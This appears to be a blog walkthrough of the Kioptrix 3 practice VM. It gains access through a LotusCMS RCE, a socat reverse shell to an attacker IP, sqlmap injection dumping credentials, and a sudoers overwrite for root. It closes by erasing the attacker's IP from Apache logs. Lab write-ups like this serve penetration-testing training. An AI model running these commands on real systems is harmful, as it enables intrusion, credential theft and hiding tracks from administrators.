---
layout: post
title: Kioptrix 3 - Walkthrough
---

Another VM finished.

## Port 80

The CMS is a very old and crappy software called LotusCMS. So I just searched for LotusCMS in metasploit and found a rce that worked perfectly. Then I uploaded a meterpreter reverse-shell to the gallery/photos folder. Just in case the rce wreaks havoc. To have a backup.


In the file admin.dat I found a user and hash.

```
root:kioptix3/ # cat admin.dat
|318d8dd409db395f0317efa71b3bad13e1fb9857|administrator|bla@bla.com#   
```

I checked the documentation and the source code and found that it encrypts with sha1. So I ran hashcat against it with rockyou and a few other wordlists. But I was not able to retrieve the password. very frustrating.

I also tried several local priv-esc exploits. And none worked.

I tried out a new trick I just learned, to get a interactive tty-shell. Usually I just create a tty-shell, but that can be annoying since you don't have autocomplete and up/down arros.

So I did this

```
wget https://github.com/cornerpirate/socat-shell/raw/master/socat.tar --no-check-certificate
```
Ran the install-script and then followed the instructions and I got a interative shell.

```
./socat tcp:192.168.1.102:4545 exec:"bash -i",pty,stderr,setsid,sigint,sane
```

After moving around in the system for some time I gave up on finding a priv-sec from there. ANd I thought to myself: enumerate enumerate enumarate. So I started looking closer at the CMS and found a possible sql-injection:

```
/gallery/gallery.php?id=1&sort=photoid
```

I ran sqlmap against it and it retrieved the users and even cracked the md5 passwords. What a service.

```
Database: gallery
Table: gallarific_users
[1 entry]
+--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+
| userid | photo   | email   | website | username | lastname | joincode | usertype  | password | firstname | datejoined | issuperuser |
+--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+
| 1      | <blank> | <blank> | <blank> | admin    | User     | <blank>  | superuser | n0t7t1k4 | Super     | 1302628616 | 1           |
+--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+
```


```
Database: gallery
Table: dev_accounts
[2 entries]
+----+------------+---------------------------------------------+
| id | username   | password                                    |
+----+------------+---------------------------------------------+
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |
+----+------------+---------------------------------------------+
```

So I logged in to the user loneferret, since it was the user with most privileges.

I checked out what sudo-commands I could run, and found this:

```
sudo -l
```
```
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```

So I tried the trick to write my own script and have it run by sudo, but it didn't work.

```
PATH=/home/loneferret/pwn:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Then I started investigating `ht`. I created a setuid-binary that I tried to get ht to execute. I thought it would execute it like gdb, but I didn't. So instead I checked out `/etc/shadow`

And tried to crack the root password for some time with hashcat. But it failed.
```
root:$1$QAKvVJey$6rRkAMGKq1u62yfDaenUr1
```

I was unable to edit any files, really annoying. I have no clue why, something messed up with the keybindings. So instead I just created a new file for sudo and then saved it as /etc/sudoers, and gave myself sudo-rights.

```
Defaults env_reset

root ALL=(ALL) ALL
loneferret ALL=(ALL) ALL

```
Then I was able to do sudo su and got root.


## Cleaning up
Then I started to check out the logs just to see how stealthy I had been. I had run dirb, so that had produced about 35000 log entries in /var/log/apache2/error.log. And cleaned up the logs a bit for fun with this command:

```
grep -v '192.168.1.102' /var/log/apache2/error.log > a && mv a /var/log/apache2/error.log
```
